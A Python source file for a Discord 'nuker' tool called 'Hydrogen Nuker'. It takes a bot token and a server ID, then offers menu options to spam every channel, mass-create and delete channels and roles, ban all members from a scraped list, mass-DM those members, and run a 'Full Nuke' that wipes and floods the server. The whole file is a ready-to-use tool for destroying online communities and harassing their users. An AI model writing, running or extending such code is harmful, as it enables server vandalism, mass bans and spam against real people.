import threading
import json
import time
import requests
import os
import random
import colorama
from colorama import Fore,Back,Style
import asyncio
import json
from pystyle import*
import logging
import datetime
from threading import Thread
import queue
global msg
msg=0
global chd
chd=0
global chm
chm=0
global err
err=0
def print_message(action,success=True,response_code=None):
        if success:status=f"{Fore.BLUE}[ ~ ]"
        else:status=f"{Fore.BLUE}[ ! ]"
        if response_code is not None:status+=f" Response Code: {response_code}"
        print(f"{status}     {action}")
def clear():
        if os.name=='nt':os.system('cls')
        else:os.system('clear')
logging.getLogger('discord').setLevel(logging.ERROR)
logging.getLogger('discord.http').setLevel(logging.ERROR)
logging.getLogger('discord.state').setLevel(logging.ERROR)
global tkn
global session
session=requests.Session()
def set_console_title(title):os.system(f"title {title}")
def get_valid_token():
        while True:
                tkn=input(f"[ + ]     Token: ");headers={'Authorization':f"Bot {tkn}"};Write.Print(f"[ + ]     Checking token.\n",Colors.blue,interval=.005);response=requests.get('https://discord.com/api/v9/users/@me',headers=headers)
                if response.status_code==200:Write.Print(f"[ + ]     Token valid.\n",Colors.blue,interval=.005);return tkn
                else:Write.Print(f"[ + ]     Please enter a valid token.\n",Colors.blue,interval=.005)
def get_valid_guild(prompt,is_valid):
        while True:
                user_input=input(prompt);Write.Print(f"[ + ]     Checking guild.\n",Colors.blue,interval=.005)
                if len(user_input)>10 and is_valid(user_input):return user_input
                else:Write.Print(f"[ + ]     Please enter a valid guild id.\n",Colors.blue,interval=.005)
def is_valid_guild_id(guild_id):headers={'Authorization':f"Bot {tkn}"};response=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}",headers=headers);return response.status_code==200;Write.Print(f"[ + ]     Guild valid.\n",Colors.blue,interval=.005)
def get_integer_input(prompt):
        while True:
                try:user_input=int(input(prompt));return user_input
                except ValueError:Write.Print(f"[ + ]     Please enter a valid integer.\n",Colors.blue,interval=.005)
def send_message_to_channel(bottoken,channel_id,message,amount):
        channel_url=f"https://discord.com/api/channels/{channel_id}/messages";headers={'Authorization':f"Bot {bottoken}",'Content-Type':'application/json'}
        for _ in range(amount):data={'content':message};response=requests.post(channel_url,headers=headers,json=data)
def send_messages_to_all_channels(bottoken,guild_id,message,amount,num_threads=5):
        headers={'Authorization':f"Bot {bottoken}"};response=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels",headers=headers);channels=response.json();result_queue=queue.Queue()
        for channel in channels:channel_id=channel['id'];thread=threading.Thread(target=send_message_to_channel,args=(bottoken,channel_id,message,amount));thread.start()
        thread.join()
def spam():global tkn;global svr;message=input(f"{Fore.BLUE}[ + ]     Enter the message to send: {Fore.RESET}");amount=get_integer_input(f"{Fore.BLUE}[ + ]     Enter the number of messages to send: {Fore.RESET}");num_threads=20;send_messages_to_all_channels(tkn,svr,message,amount,num_threads);input(f"{Fore.BLUE}[ + ]     Complete. Press enter to go back.");menu()
def delete_channel(channel_id,token,result_queue,max_retries=5):
        headers={'Authorization':f"Bot {token}"}
        for _ in range(max_retries):
                response=requests.delete(f"https://discord.com/api/v9/channels/{channel_id}",headers=headers)
                if response.status_code==200:result_queue.put(f"Channel {channel_id} deleted successfully.");return
                else:result_queue.put(f"Error deleting channel {channel_id}: {response.status_code}")
        result_queue.put('Max retries reached for deleting channel {channel_id}.')
def delete_all_channels(token,guild_id,num_threads=100):
        headers={'Authorization':f"Bot {token}"};response=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels",headers=headers);channels=response.json();result_queue=queue.Queue();threads=[]
        for channel in channels:
                channel_id=channel['id'];thread=threading.Thread(target=delete_channel,args=(channel_id,token,result_queue));thread.start();threads.append(thread)
                if len(threads)>=num_threads:
                        for t in threads:t.join()
                        threads=[]
        for t in threads:t.join()
        while not result_queue.empty():print_message(result_queue.get())
def channeldelete():global tkn;global svr;delete_all_channels(tkn,svr);print_message('All channels deleted.')
def create_channel(guild_id,token,channel_name,result_queue):
        headers={'Authorization':f"Bot {token}",'Content-Type':'application/json'};data={'name':channel_name,'type':0};response=requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels",headers=headers,json=data)
        if response.status_code==201:print_message(f"Channel '{channel_name}' created successfully.")
        else:print_message(f"Error creating channel '{channel_name}': {response.status_code}")
def channelcreate():
        global tkn;global svr;channel_name=input(f"{Fore.BLUE}[ + ]     Enter the channel name: ");num_channels=get_integer_input(f"{Fore.BLUE}[ + ]     Enter the number of channels to create: ");num_threads=150;result_queue=queue.Queue();threads=[]
        for _ in range(num_channels):
                thread=threading.Thread(target=create_channel,args=(svr,tkn,channel_name,result_queue));thread.start();threads.append(thread)
                if len(threads)>=num_threads:
                        for t in threads:t.join()
                        threads=[]
        for t in threads:t.join()
        while not result_queue.empty():print(result_queue.get())
def create_role(guild_id,token,role_name,role_color,result_queue):
        headers={'Authorization':f"Bot {token}",'Content-Type':'application/json'};data={'name':role_name,'color':role_color};response=requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles",headers=headers,json=data)
        if response.status_code==200:print_message(f"Role '{role_name}' created successfully.")
        else:print(f"{Fore.BLUE}[ + ]     Error creating role '{role_name}': {response.status_code}")
def createroles():
        global tkn;global svr;name=input(f"{Fore.BLUE}[ + ]     Role name: ");num_roles=get_integer_input(f"{Fore.BLUE}[ + ]     Enter the number of roles to create: ");num_threads=100;result_queue=queue.Queue();threads=[]
        for i in range(num_roles):
                role_name=name;role_color=16711680;thread=threading.Thread(target=create_role,args=(svr,tkn,role_name,role_color,result_queue));thread.start();threads.append(thread)
                if len(threads)>=num_threads:
                        for t in threads:t.join()
                        threads=[]
        for t in threads:t.join()
        while not result_queue.empty():print(result_queue.get())
def delete_role(role_id,guild_id,token,result_queue):
        headers={'Authorization':f"Bot {token}"};response=requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}",headers=headers)
        if response.status_code==204:print_message(f"Role {role_id} deleted successfully.")
        else:print(f"{Fore.BLUE}Error deleting role {role_id}: {response.status_code}")
def delete_all_roles(token,guild_id,num_threads=100):
        headers={'Authorization':f"Bot {token}"};response=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles",headers=headers);roles=response.json();result_queue=queue.Queue();threads=[]
        for role in roles:
                role_id=role['id'];thread=threading.Thread(target=delete_role,args=(role_id,guild_id,token,result_queue));thread.start();threads.append(thread)
                if len(threads)>=num_threads:
                        for t in threads:t.join()
                        threads=[]
        for t in threads:t.join()
        while not result_queue.empty():print(result_queue.get())
def ban(guild_id:str,member:str,token:str):
        payload={'delete_message_days':random.randint(0,7)}
        while True:
                response=requests.put(f"https://discord.com/api/v8/guilds/{guild_id}/bans/{member}",headers={'Authorization':f"Bot {token}"},json=payload)
                if response.status_code in[200,201,204]:print_message(f"Banned {member}",response_code=response.status_code);banned.append(member);break
                elif'retry_after'in response.text:time.sleep(response.json()['retry_after'])
                elif'Missing Permissions'in response.text:print_message('Missing permissions',success=False,response_code=response.status_code);break
                elif'You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently.'in response.text:print_message("You're being excluded from Discord API",success=False,response_code=response.status_code);break
                elif'Max number of bans for non-guild members have been exceeded.'in response.text:print_message('Max number of bans for non-guild members have been exceeded',success=False,response_code=response.status_code);break
                else:print_message('Unknown error occurred',success=False,response_code=response.status_code);break
banned=[]
def ban_all(guild_id,token):
        members=open('scraped/members.txt','r').read().splitlines();threads=[]
        for member in members:t=threading.Thread(target=ban,args=(guild_id,member,token));threads.append(t);t.start()
        for t in threads:t.join()
        print_message(f"Lithuim banned {len(banned)}/{len(members)}")
def dm_all_users(token,server,message,file_path='scraped/members.txt'):
        headers={'Authorization':f"Bot {token}",'Content-Type':'application/json'}
        with open(file_path,'r')as file:user_ids=[line.strip()for line in file]
        def send_dm(user_id):
                channel_create_payload={'recipient_id':user_id};response=requests.post(f"https://discord.com/api/v9/users/@me/channels",headers=headers,json=channel_create_payload)
                if response.status_code==200:
                        channel_id=response.json()['id'];message_payload={'content':message};response=requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages",headers=headers,json=message_payload)
                        if response.status_code==200:print_message(f"Message sent to user {user_id} successfully.",True,response.status_code)
                        else:print_message(f"Error sending message to user {user_id}: {response.status_code}",False,response.status_code)
                else:print_message(f"Error creating DM channel with user {user_id}: {response.status_code}",False,response.status_code)
        for user_id in user_ids:send_dm(user_id)
def deleteroles():global tkn;global svr;delete_all_roles(tkn,svr);print(f"{Fore.BLUE}[ + ]     All roles deleted.");input(f"{Fore.BLUE}[ + ]     Press enter to go back...{Fore.RESET}")





def menu():
    global tkn
    global svr
    clear()
    print(Colorate.Vertical(Colors.blue_to_white, Center.XCenter(ascii)))
    print(Colorate.Vertical(Colors.blue_to_white, Center.XCenter(ascii2)))
    option = input(f"""



{Fore.BLUE}[ + ]     Option:  {Fore.RESET}""")
    if option == "1":
        spam()
        input(f"{Fore.BLUE}[ + ]     Press enter to go back...")
        menu()

    elif option == "2":
        channelcreate()
        input(f"{Fore.BLUE}[ + ]     Press enter to go back...")
        menu()

    elif option == "3":
        channeldelete()
        input(f"{Fore.BLUE}[ + ]     Press enter to go back...")
        menu()

    elif option == "4":
        createroles()
        input(f"{Fore.BLUE}[ + ]     Press enter to go back...")
        menu()

    elif option == "5":
        deleteroles()
        menu()

    elif option == "6":
        ban_all(svr, tkn)
        input(f"{Fore.BLUE}[ + ]     Press enter to go back...")
        menu()


    elif option == "7":
        message = input(f"{Fore.RED}[ + ]     Message: ")
        dm_all_users(tkn, svr, message)
        input(f"{Fore.BLUE}[ + ]     Press enter to go back...")
        menu()

    elif option == "8":
        channeldelete()
        channelcreate()
        spam()

    else:
        print(f"{Fore.Red} Invalid option. ")
        menu()


ascii = """



▒█░░▒█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█ 　 ▀▄▒▄▀ 
▒█▄▄▄█ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█ 　 ░▒█░░ 
░░▒█░░ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█ 　 ▄▀▒▀▄
                                                                  
 [<                 || made by known_as_yash , jai shree ram ||                   >]
                              


"""
ascii2 = """
╔════════════════════════════════╦════════════════════════════════╦════════════════════════════════╗
║ [ 1 ] - Spam all channels      ║ [ 2 ] - Create channels        ║ [ 3 ] - Delete channels        ║
╠════════════════════════════════╬════════════════════════════════╬════════════════════════════════╣
║ [ 4 ] - Create roles           ║ [ 5 ] - Delete roles           ║ [ 6 ] - Ban members            ║
╠════════════════════════════════╬════════════════════════════════╬════════════════════════════════╣
║ [ 7 ] - Mass Dm                ║ [ 8 ] - Full Nuke              ║ [ 9 ] - - - - - - - - - - - -  ║
╚════════════════════════════════╩════════════════════════════════╩════════════════════════════════╝"""
clear()
set_console_title(f"Hydrogen Nuker")
print(Colorate.Vertical(Colors.blue_to_white, Center.XCenter(ascii)))
tkn = get_valid_token()
svr = get_valid_guild("[ + ]     Server ID: ", is_valid_guild_id)
Write.Print(f"[ + ]     Guild valid.\n", Colors.blue, interval=0.005)

clear()
menu()
